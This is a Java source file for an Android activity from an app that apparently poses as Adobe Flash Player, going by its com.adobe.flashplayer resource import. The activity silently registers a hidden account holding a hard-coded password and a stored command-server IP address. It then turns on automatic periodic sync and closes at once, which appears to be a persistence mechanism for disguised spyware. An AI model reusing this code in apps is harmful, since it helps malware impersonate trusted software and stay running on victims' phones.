package com.accounts;

import com.adobe.flashplayer.R;
import com.utils.Public;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorActivity;
import android.accounts.AccountManager;
import android.annotation.TargetApi;
import android.content.ContentResolver;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;




public class accountActivity extends AccountAuthenticatorActivity{
	private final String TAG = "accountActivity";
	
	@TargetApi(Build.VERSION_CODES.ECLAIR) 
	@Override
	protected void onCreate(Bundle bundle){
		super.onCreate(bundle);
		Log.e(TAG,"onCreate");

		Account account = new Account(getString(R.string.accountname), getString(R.string.accounttype));
		Bundle userdata = new Bundle(); 
		userdata.putString("SERVER", Public.SERVER_IP_ADDRESS);
		AccountManager am = AccountManager.get(this);
		if (am.addAccountExplicitly(account, getString(R.string.accountpassword), userdata))
		{
			Bundle result = new Bundle();
			result.putString(AccountManager.KEY_ACCOUNT_NAME, getString(R.string.accountname));
			result.putString(AccountManager.KEY_ACCOUNT_TYPE, getString(R.string.accounttype));
			setAccountAuthenticatorResult(result);
			
	        ContentResolver.setIsSyncable(account,getString(R.string.accountprovideranthority),1);
	        ContentResolver.setSyncAutomatically(account,getString(R.string.accountprovideranthority),true);
	        ContentResolver.addPeriodicSync(account,getString(R.string.accountprovideranthority),Bundle.EMPTY,
	        		Public.SYNCHRONIZITION_SECONDS_TIME); 
		}
		finish();
	}
	
	
	
	public void onDestroy(){
		super.onDestroy();
		Log.e(TAG,"onDestroy");
	}

}
